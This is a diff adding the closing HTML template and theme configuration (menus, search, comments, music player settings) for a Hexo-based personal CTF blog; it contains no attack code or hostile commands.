+            $(document).on("blur", ".wl-header-item .wl-input", function() {
+                $(this).parent().css("border-bottom-color", "var(--input-border-color)");
+            });
+        </script>
+    
+ 
+        </div>
+    
+</div>
+    <div id="footer">
+    <div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【I hack,<span><i class='iconfont icon-like-fill'></i></span>therefore I am.】</div><div>&copy; 2024-2026 debu8ger. All Rights Reserved.</div>
+</div>
+    <div id="sidebar">
+    <div class="menu-wrap" style="display:none;">
+        
+            <div class="menu-notice">
+                <span class="iconfont icon-notice"></span>
+                <div class="notice">
+                    <span>Bonjour, 欢迎来到debu8gerのCTF小站！</span>
+                </div>
+            </div>
+        
+        <nav class="menu">
+            <div class="menu-introduce"> 
+                <div class="introduce-avatar">
+                    <img src="/static/avatar/avatar0.jpg">
+                </div> 
+                <div class="introduce-info"> 
+                    <div class="introduce-user">
+                        
+                            <a href="https://incldue.github.io/" target="_blank"><span>D'b8Gr</span></a>
+                        
+                    </div>
+                </div> 
+            </div> 
+            <div class="menu-list">
+                <ul>
+                    
+                        <li class=""><a href="/" class="" target="_self"><span class="iconfont icon-home-fill"></span>首页</a></li>
+                    
+                        <li class=""><a href="/category" class="" target="_self"><span class="iconfont icon-folder-fill"></span>分类</a></li>
+                    
+                        <li class=""><a href="/tag" class="" target="_self"><span class="iconfont icon-discount-fill"></span>标签</a></li>
+                    
+                        <li class=""><a href="/archive" class="" target="_self"><span class="iconfont icon-calendar-fill"></span>归档</a></li>
+                    
+                        <li class=""><a href="/about" class="" target="_self"><span class="iconfont icon-about-fill"></span>关于</a></li>
+                    
+                        <li class=""><a href="/atom.xml" class="" target="_blank"><span class="iconfont icon-rss"></span>订阅</a></li>
+                    
+                        <li class=""><a href="javascript:;" class="search" target="_self"><span class="iconfont icon-search-menu"></span>搜索</a></li>
+                    
+                        <li class=""><a href="/comment" class="" target="_self"><span class="iconfont icon-comments-fill"></span>留言板</a></li>
+                    
+                        <li class=""><a href="/friend" class="" target="_self"><span class="iconfont icon-link"></span>友情链接</a></li>
+                    
+                </ul> 
+            </div> 
+            <div class="menu-link">
+                <div class="box">
+                    <div class="image-box"></div>
+                </div>
+                
+                    <a name="QQ" href="524633948@qq.com" class="" target="_blank" data=""><span class="iconfont icon-qq"></span></a>
+                
+                    <a name="Twitter" href="https://x.com/JonathanHu70782" class="" target="_blank" data=""><span class="iconfont icon-twitter"></span></a>
+                
+                    <a name="email" href="mailto:52463398@outlook.com" class="" target="_self" data=""><span class="iconfont icon-email"></span></a>
+                
+                    <a name="GitHub" href="https://github.com/incldue" class="" target="_blank" data=""><span class="iconfont icon-github"></span></a>
+                
+            </div> 
+        </nav>
+        <button class="menu-button-close"></button>
+        <div class="morph-shape" id="morph-shape" data-morph-open="M-7.312,0H15c0,0,66,113.339,66,399.5C81,664.006,15,800,15,800H-7.312V0z;M-7.312,0H100c0,0,0,113.839,0,400c0,264.506,0,400,0,400H-7.312V0z">
+            <svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%" viewBox="0 0 100 800" preserveAspectRatio="none">
+                <path d="M-7.312,0H0c0,0,0,113.839,0,400c0,264.506,0,400,0,400h-7.312V0z"/>
+            </svg>
+        </div>
+    </div>
+    <button class="menu-button-open">MENU</button>
+    <div class="menu-cover"></div>
+</div>
+    <link type="text/css" rel="stylesheet" href="/css/search.css">
+<script type="text/javascript" src="/js/iscroll.js"></script>
+<script type="text/javascript" src="/js/instantsearch.min.js"></script>
+<div class="search-window">
+    <div class="search-content">
+        <div class="search-content-icon">
+            <i class="iconfont icon-search"></i>
+        </div>
+        <div id="search-input" class="search-input"></div>
+    </div>
+
+    <div class="search-scroll">
+        <div class="search-result">
+            <div id="search-stats" class="search-stats"></div>
+            <div id="search-hits"></div>
+            <div id="search-pagination" class="search-pagination"></div>
+        </div>
+    </div>
+
+    <span class="search-close-icon">
+        <i class="iconfont icon-close"></i>
+    </span>
+</div>
+    <div id="tools">
+    <div class="progressbar-top"></div>
+    
+    <link type="text/css" rel="stylesheet" href="/css/APlayer.css">
+    <script type="text/javascript" src="/js/APlayer.min.js"></script>
+    <script type="text/javascript" src="/js/Meting.min.js"></script>
+    <script>
+        var meting_api = 'https://api.i-meto.com/meting/api?server=:server&type=:type&id=:id&auth=:auth&r=:r';
+    </script>
+    <meting-js id="3778678" lrcshow="false" server="netease" type="playlist" fixed="true" autoplay="false" loop="all" order="random" preload="auto" volume="0.67" mutex="true"></meting-js>
+
+    <div class="wrap-right">
+    <div class="wrap-right-hide">
+         <div class="wrap-right-button favorites">
+            <div class="iconbox" switch="false">
+                <span class="iconfont icon-favorites"></span>
+            </div>
+            <span class="icontext">关注</span>
+         </div>
+        <div class="wrap-right-button search">
+            <div class="iconbox">
+                <span class="iconfont icon-search-menu"></span>
+            </div>
+            <span class="icontext">搜索</span>
+        </div>
+        <div class="wrap-right-button menu-button">
+            <div class="iconbox">
+                <span class="iconfont icon-menu"></span>
+            </div>
+            <span class="icontext">菜单</span>
+        </div>
+        <div class="wrap-right-button mode">
+            <div class="light">
+                <div class="iconbox">
+                    <span class="iconfont icon-daymode"></span>
+                </div>
+                <span class="icontext">浅色模式</span>
+            </div>
+            <div class="dark">
+                <div class="iconbox">
+                    <span class="iconfont icon-nightmode-fill"></span>
+                </div>
+                <span class="icontext">深色模式</span>
+            </div>
+        </div>
+        <div class="wrap-right-button bottom">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">跳至底部</span>
+        </div>
+    </div>
+    <div class="wrap-right-show">
+        <div class="wrap-right-button set">
+            <div class="iconbox">
+                <span class="iconfont icon-setting"></span>
+            </div>
+            <span class="icontext">设置</span>
+        </div>
+        <div class="wrap-right-button top">
+            <div class="iconbox">
+                <span class="iconfont icon-top"></span>
+            </div>
+            <span class="icontext">返回顶部</span>
+        </div>
+    </div>
+</div>
+    <div class="loading"></div>
+</div>
+    <script>
+    window.config = {
+        GitHubUserName     : "incldue",
+        GitHubRepositories : "incldue.github.io",
+
+        User             : "D'b8Gr",
+        UserAvatar       : "/static/avatar/avatar0.jpg",
+        WebsiteStartDate : "2025-06-01",
+        Home             : "https://incldue.github.io/",
+
+        WebsiteTitleBlur         : "(◍´ڡ`◍) Hi, there!",
+        WebsiteTitleBlurTimeOut  : 500,
+        WebsiteTitleFocus        : "(*´∇｀*) 欢迎回来!",
+        WebsiteTitleFocusTimeOut : 1000,
+        WebsiteFavicon           : {
+            light : "/static/avatar/avatar.png",
+            dark  : "/static/avatar/avatar.png"
+        },
+
+        ProgressBar : {
+            id       : "topProgressBar",
+            color    : "#77B6FF",
+            height   : "2px",
+            duration : 0.2
+        },
+
+        Loading: {
+            rebound : {
+                tension  : 16,
+                friction : 5
+            },
+            spinner : {
+                id     : "spinner",
+                radius : 90,
+                sides  : 3,
+                depth  : 4,
+                colors : {
+                    background : "#F0F0F0",
+                    stroke     : "#272633",
+                    base       : "",
+                    child      : "#272633"
+                },
+                alwaysForward : true,
+                restAt        : 0.5,
+                renderBase    : false
+            }
+        },
+
+        HomeHeaderAnimationRendered : true,
+        HomeHeaderAnimation         : {
+            radius      : 15,
+            density     : 0.2,
+            color       : "rgba(255, 255, 255, .2)",
+            clearOffset : 0.3
+        },
+
+        BackAnimationRendered          : true,
+        IEBrowserBackAnimationRendered : false,
+        BackAnimation                  : {
+            colorSaturation  : "60%",
+            colorBrightness  : "50%",
+            colorAlpha       : 0.5,
+            colorCycleSpeed  : 5,
+            verticalPosition : "random",
+            horizontalSpeed  : 200,
+            ribbonCount      : 3,
+            strokeSize       : 0,
+            parallaxAmount   : -0.2,
+            animateSections  : true
+        },
+
+        HomeHeaderImage : [
+            
+                "/static/bgimage/beach.png",
+            
+                "/static/bgimage/sky.png",
+            
+                "/static/bgimage/starrysky.png",
+            
+        ],
+        HomeBannerText  : "",
+
+        ArticleHeaderImage : [
+            
+                "/static/article.png",
+            
+        ],
+
+        OtherBannerText : "",
+
+        Error : {
+            icon    : "icon-swimming",
+            title   : "PAGE NOT FOUND",
+            content : [
+                
+                    "很抱歉，您访问的页面不存在！",
+                
+                    "可能是输入地址有误或该地址已变更。",
+                
+            ],
+            buttons : [
+                
+                    {
+                        icon  : "icon-home",
+                        text  : "返回首页",
+                        href  : "/",
+                        class : ""
+                    },
+                
+            ]
+        },
+
+        MenuNotice : {
+            enable : true,
+            notice : "Bonjour, 欢迎来到debu8gerのCTF小站！",
+            speed  : 20
+        },
+        MenuList : [
+            
+                {
+                    name   : "首页",
+                    icon   : "icon-home-fill",
+                    href   : "/",
+                    type   : "index",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "分类",
+                    icon   : "icon-folder-fill",
+                    href   : "/category",
+                    type   : "category",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "标签",
+                    icon   : "icon-discount-fill",
+                    href   : "/tag",
+                    type   : "tag",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "归档",
+                    icon   : "icon-calendar-fill",
+                    href   : "/archive",
+                    type   : "archive",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "关于",
+                    icon   : "icon-about-fill",
+                    href   : "/about",
+                    type   : "about",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "订阅",
+                    icon   : "icon-rss",
+                    href   : "/atom.xml",
+                    type   : "",
+                    class  : "",
+                    target : "_blank"
+                },
+            
+                {
+                    name   : "搜索",
+                    icon   : "icon-search-menu",
+                    href   : "javascript:;",
+                    type   : "",
+                    class  : "search",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "留言板",
+                    icon   : "icon-comments-fill",
+                    href   : "/comment",
+                    type   : "comment",
+                    class  : "",
+                    target : "_self"
+                },
+            
+                {
+                    name   : "友情链接",
+                    icon   : "icon-link",
+                    href   : "/friend",
+                    type   : "friend",
+                    class  : "",
+                    target : "_self"
+                },
+            
+        ],
+        MenuLink : [
+            
+                
+                    {
+                        name   : "QQ",
+                        icon   : "icon-qq",
+                        href   : "524633948@qq.com",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "Twitter",
+                        icon   : "icon-twitter",
+                        href   : "https://x.com/JonathanHu70782",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "email",
+                        icon   : "icon-email",
+                        href   : "mailto:52463398@outlook.com",
+                        class  : "",
+                        target : "_self",
+                        image  : ""
+                    },
+                
+                    {
+                        name   : "GitHub",
+                        icon   : "icon-github",
+                        href   : "https://github.com/incldue",
+                        class  : "",
+                        target : "_blank",
+                        image  : ""
+                    },
+                
+            
+        ],
+
+        FooterStyle : 2,
+        BottomText  : "<div><span class='face'>ღゝ◡╹)ノ♡</span></div><div>【I hack,<span><i class='iconfont icon-like-fill'></i></span>therefore I am.】</div><div>&copy; 2024-2026 debu8ger. All Rights Reserved.</div>",
+
+        ConsoleList : [
+            
+                
+                    [
+                        
+                            
+                                "Based on cnblogs theme SimpleMemory.",
+                            
+                                "",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "SimpleMemory Author:",
+                            
+                                "BNDong",
+                            
+                        
+                    ],
+                
+                    [
+                        
+                            
+                                "Theme:",
+                            
+                                "LiveForCode",
+                            
+                        
+                    ],
+                
+            
+        ],
+
+        FontIconExtend : "",
+
+        Donate : {
+            paypal  : "",
+            bitcoin : "",
+            alipay  : "",
+            wechat  : ""
+        },
+
+        Search : {
+            applicationID : "010C3EANT8",
+            apiKey        : "c7abab9f11b79102b9aff7fe6d41447d",
+            indexName     : "Notes",
+            hits          : {
+                page : 10
+            },
+            labels        : {
+                placeholder : "搜索",
+                empty       : "未发现与 「${query}」 相关的内容",
+                stats       : "${hits} 条相关条目，使用了 ${time} 毫秒",
+            }
+        }, 
+
+        Comment : {
+            switch : true,
+            type   : "Waline",
+        },
+
+        Waline : {
+            el              : ".comments-content",
+            serverURL       : "https://waline-pi-blue-88.vercel.app/",
+            path            : window.location.pathname,
+            meta            : "['nick', 'mail', 'link']",
+            requiredMeta    : "['nick', 'mail']",
+            pageSize        : 10,
+            lang            : "zh-cn",
+            locale: {
+                admin       : "博主",
+                anonymous   : "匿名用户",
+                sofa        : "快来做第一个评论的人吧 ~",
+                placeholder : "你是我一生只会遇见一次的惊喜...",
+            },
+            dark            : "html[color-scheme='dark']",
+            search          : false,
+            pageview        : true,
+            comment         : true,
+            copyright       : false,
+        },
+
+        Valine : {
+            el             : ".comments-content",
+            appId          : "srhKtvWPQTWYKh3qX8G8M7v0-gzGzoHsz",
+            appKey         : "8uVSP1q6UlALVC5igYfIfv2h",
+            serverURLs     : "",
+            placeholder    : "你是我一生只会遇见一次的惊喜...",
+            avatar         : "mm",
+            meta           : "nick,mail,link",
+            requiredFields : "nick,mail",
+            pageSize       : 5,
+            lang           : "zh-cn",
+            visitor        : true,
+            enableQQ       : true
+        },
+
+        Tocbot : {
+            switch                : true,
+            tocSelector           : ".toc",
+            contentSelector       : ".article-body",
+            headingSelector       : "h1, h2, h3, h4, h5",
+            headingsOffset        : 0,
+            scrollSmooth          : true,
+            scrollSmoothOffset    : -5,
+            positionFixedSelector : ".toc",
+            positionFixedClass    : "toc-fixed",
+            fixedSidebarOffset    : "",
+        },
+
+        Require : {
+            baseUrl     : "/js/",
+            waitSeconds : 100
+        },
+
+        Music : {
+            type : "Meting"
+        },
+        APlayer : {
+            container : ".aplayer",
+            fixed     : true,
+            autoplay  : false,
+            loop      : "all",
+            order     : "random",
+            preload   : "auto",
+            volume    : 0.67,
+            mutex     : true,
+            lrcType   : 3,
+            audio     : [
+                
+                    {
+                        name   : "Endless Tears",
+                        artist : "CLIFF EDGE",
+                        cover  : "/music/cover/Endless Tears.jpg",
+                        url    : "/music/song/Endless Tears.mp3",
+                        lrc    : "/music/lrc/Endless Tears.lrc"
+                    },
+                
+            ]
+        },
+        Meting : {
+            api      : "https://api.i-meto.com/meting/api",
+            id       : "3778678", 
+            lrcshow  : false, 
+            server   : "netease", 
+            type     : "playlist", 
+            fixed    : true, 
+            autoplay : false, 
+            loop     : "all", 
+            order    : "random", 
+            preload  : "auto", 
+            volume   : 0.67, 
+            mutex    : true
+        },
+
+        Mouse : {
+            enable  : true,
+            options : {
+                size  : 6,
+                sizeF : 24
+            }
+        },
+
+        LazyLoad : {
+            default : "/image/website/lazyload.svg"
+        },
+  
+        Style : {
+            aplayer          : "/css/APlayer.css",
+            archive          : "/css/archive.css",
+            base             : "/css/base.css",
+            clipboard        : "/css/clipboard.css",
+            code             : "/css/code.css",
+            donate           : "/css/donate.css",
+            fancybox         : "/css/jquery.fancybox.css",
+            footer           : "/css/footer.css",
+            iconfont         : "/iconfont/iconfont.css",
+            index            : "/css/index.css",
+            menuBubble       : "/css/menu-bubble.css",
+            mouse            : "/css/mouse.css",
+            page             : "/css/page.css",
+            post             : "/css/post.css",
+            search           : "/css/search.css",
+            tocbot           : "/css/tocbot.css",
+            valine           : "/css/valine.css",
+            waline           : "/css/waline.css",
+            walineCustom     : "/css/waline-custom.css"
+        },
+
+        Script: {
+            aplayer          : "/js/APlayer.min.js",
+            config           : "/js/require.config.js",
+            index            : "/js/index.js",
+            instantSearch    : "/js/instantsearch.min.js",
+            iscroll          : "/js/iscroll.js",
+            jQuery           : "/js/jquery-3.4.1.min.js",
+            loading          : "/js/loading.js",
+            meting           : "/js/Meting.min.js",
+            require          : "/js/require.min.js",
+            waline           : "/js/waline.mjs",
+            pageview         : "/js/pageview.mjs",
+            comment          : "/js/comment.mjs",
+        },
+
+        Font: {
+            LongCang    : "/font/LongCang.css",
+            Monda       : "/font/Monda.css",
+            NotoSansSC  : "/font/NotoSansSC.css",
+            NotoSerifSC : "/font/NotoSerifSC.css",
+            Playball    : "/font/Playball.css",
+            PTMono      : "/font/PTMono.css",
+            Roboto      : "/font/Roboto.css",
+            RobotoSlab  : "/font/RobotoSlab.css",
+            Rosario     : "/font/Rosario.css",
+            UbuntuMono  : "/font/UbuntuMono.css"
+        },
+
+        Suffix : {
+            about : "I hack,therefore I am."
+        },
+            
+        Theme : {
+            url  : "https://github.com/first19326/Hexo-LiveForCode",
+            name : "Hexo - Live For Code"
+        }  
+    };
+</script>
+    <script type="text/javascript" src="/js/index.js"></script>
+</body>
+</html>
